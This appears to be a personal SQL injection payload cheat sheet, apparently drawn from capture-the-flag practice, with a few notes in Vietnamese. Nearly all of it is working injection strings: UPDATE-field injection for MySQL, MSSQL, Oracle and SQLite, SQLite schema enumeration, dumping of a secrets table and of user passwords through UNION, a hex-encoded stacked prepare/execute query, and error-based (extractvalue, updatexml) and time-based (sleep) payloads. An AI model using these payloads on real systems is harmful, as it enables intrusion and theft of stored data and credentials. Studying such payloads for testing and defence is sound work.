```UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>```
UPDATE usertable SET nickName='capybara',email='test@test.com',password='ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a' WHERE UID='1'
UPDATE usertable SET nickName='',nickName='database()', email='test@test.com',password='ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a' WHERE UID='1'
```
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='
```
SQLite

```',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='```

```',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='```

```',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email='```

```' UNION SELECT 1,group_concat(password) FROM users-- -```



Use preparestatement to execute query 

"select flag from \`1919810931114514\`" => 73656c65637420666c61672066726f6d20603139313938313039333131313435313460

```1'; prepare abc from 73656c65637420666c61672066726f6d20603139313938313039333131313435313460; execute abc```


Sử dụng extractvalue: -1' and extractvalue(1,concat(0x7e,(select schema_name from information_schema.schemata)))-- -

Time base: '1)) union select 1,2,elt((select substr('abc',1,1) from information_schema.schemata limit 0,1)='a',sleep(5))-- -

Sử dụng updateXML: 1',updatexml(1,concat(0x7e,(select database()),0x7e),1))-- -

select name from demo where name = 'dasd' union values(char(97)||char(100)||char(109)||char(105)||char(110))


